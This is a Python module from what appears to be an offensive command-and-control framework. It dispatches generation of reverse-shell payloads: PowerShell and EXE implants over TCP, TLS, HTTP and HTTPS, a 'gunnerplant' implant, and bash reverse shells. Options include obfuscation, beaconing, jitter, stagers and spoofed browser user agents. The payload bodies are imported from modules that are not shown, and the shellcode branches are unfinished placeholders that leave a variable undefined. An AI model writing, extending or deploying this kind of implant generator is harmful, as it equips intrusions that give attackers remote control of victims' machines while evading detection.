import base64
import random
import string
import pyperclip
import re
from core.payload_generator.common import payload_utils as payutils

# Windows TCP payloads
from core.payload_generator.windows.tcp.ps1 import powershell_reverse_tcp
from core.payload_generator.windows.tcp.exe import exe_reverse_tcp

# Windows TLS payloads
from core.payload_generator.windows.tls.exe import exe_reverse_tls
from core.payload_generator.windows.tls.ps1 import powershell_reverse_tls

# Windows HTTP payloads
from core.payload_generator.windows.http.exe import exe_reverse_http
from core.payload_generator.windows.http.ps1 import powershell_reverse_http

# Windows HTTPS payloads
from core.payload_generator.windows.https.ps1 import powershell_reverse_https
from core.payload_generator.windows.https.exe import exe_reverse_https
from core.payload_generator.windows.https.gunnerplant import gunnerplant_reverse_https

# Bash Payloads
from core.payload_generator.linux.tcp import bash_reverse_tcp
from core.payload_generator.linux.http import bash_reverse_http

# Colorama settings
from colorama import init, Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"



def generate_payload_windows(ip, port, obs, format_type, payload_type, beacon_interval, no_child=None, headers=None, useragent=None, accept=None, byte_range=None, jitter=0, stager_ip="0.0.0.0", stager_port=9999, profile=None):
    if not useragent or useragent is None:
        useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

    if payload_type == "tcp":
        if format_type == "ps1":
            raw = powershell_reverse_tcp.generate_powershell_reverse_tcp(ip, port, obs, no_child)

        elif format_type == "exe":
            raw = exe_reverse_tcp.generate_exe_reverse_tcp(ip, port, stager_ip, stager_port)

        elif format_type == "shellcode":
            test = 1

    elif payload_type == "tls":
        if format_type == "ps1":
            raw = powershell_reverse_tls.generate_powershell_reverse_tls(ip, port, obs, no_child)

        elif format_type == "exe":
            raw = exe_reverse_tls.generate_exe_reverse_tls(ip, port, stager_ip, stager_port)

        elif format_type == "shellcode":
            test = 1

    elif payload_type == "http":
        if format_type == "ps1":
            raw = powershell_reverse_http.generate_windows_powershell_http(ip, port, obs, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter, no_child=None, profile=profile)

        elif format_type == "exe":
            raw = exe_reverse_http.generate_exe_reverse_http(ip, port, obs, beacon_interval, headers, useragent, stager_ip, stager_port,
                accept=accept, byte_range=byte_range, jitter=jitter, profile=profile)

    elif payload_type == "https":
        if format_type == "ps1":
            raw = powershell_reverse_https.generate_windows_powershell_https(ip, port, obs, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter, no_child=None, profile=profile)

        elif format_type == "exe":
            raw = exe_reverse_https.generate_exe_reverse_https(ip, port, obs, beacon_interval, headers, useragent, stager_ip, stager_port,
                accept=accept, byte_range=byte_range, jitter=jitter, profile=profile)

        elif format_type == "gunnerplant":
            raw = gunnerplant_reverse_https.generate_gunnerplant_reverse_https(ip, port, obs, beacon_interval, headers, useragent, stager_ip, stager_port,
                accept=accept, byte_range=byte_range, jitter=jitter, profile=profile)
    if raw:
        return raw

    elif not raw:
        return False

    else:
        return False



def generate_payload_linux(ip, port, obs, use_ssl, format_type, payload_type, beacon_interval, headers=None, useragent=None, accept=None, byte_range=None, jitter=0):
    if not useragent or useragent is None:
        useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

    if payload_type == "tcp":
        raw = bash_reverse_tcp.generate_bash_reverse_tcp(ip, port, obs, use_ssl)

    elif payload_type == "http":
        raw = bash_reverse_http.generate_bash_reverse_http(ip, port, obs, beacon_interval, headers=headers, useragent=useragent, accept=accept, byte_range=byte_range, jitter=jitter)

    if raw:
        return raw

    elif not raw:
        return False

    else:
        return False